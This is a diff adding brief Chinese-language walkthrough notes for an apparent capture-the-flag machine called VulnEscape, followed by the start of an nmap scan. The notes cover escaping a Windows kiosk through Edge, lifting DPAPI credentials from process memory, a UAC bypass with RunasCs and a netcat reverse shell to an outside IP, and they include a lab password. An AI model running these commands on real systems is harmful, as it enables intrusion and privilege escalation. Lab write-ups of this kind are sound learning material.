@@ -1,6 +1,27 @@
 ## VulnEscape
 
 ```
+1.靶机为 Windows Assigned Access（Kiosk）环境，仅允许运行 Edge
+
+2.通过 Edge 的 file:// 协议逃逸至本地文件系统
+file:///c://Windows//System32//WindowsPowerShell//v1.0//
+
+3.发现 Remote Desktop Plus，定位到 profiles.xml 中的加密凭据
+PS C:\Program Files (x86)\Remote Desktop Plus> copy -r C:\_admin\ C:\Users\kioskUser0\Downloads\
+
+4.在 Remote Desktop Plus 运行并加载 profile 的前提下，使用 BulletsPassView 从进程内存中解密 DPAPI 凭据
+
+5.获得 admin 明文密码，但受 UAC 限制，仅拥有受限 token
+
+6.现场编译 RunasCs.cs，使用 RunasCs 绕过 UAC 获取高完整性管理员 token
+PS C:\temp> C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:exe /out:RunasCs.exe RunasCs.cs
+
+7.在白名单限制下伪装/替换被允许的二进制，执行 payload（nc / PowerShell）
+PS C:\temp> .\RunasCs.exe admin Twisting3021 --bypass-uac --logon-type 8  "C:\temp\nc64.exe 10.10.17.121 1235 -e cmd.exe"
+
+8.最终获得完整管理员权限 shell
+```
+```
 [★]$ nmap -sV -sC 10.129.234.51
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-19 00:17 CST
 Nmap scan report for 10.129.234.51
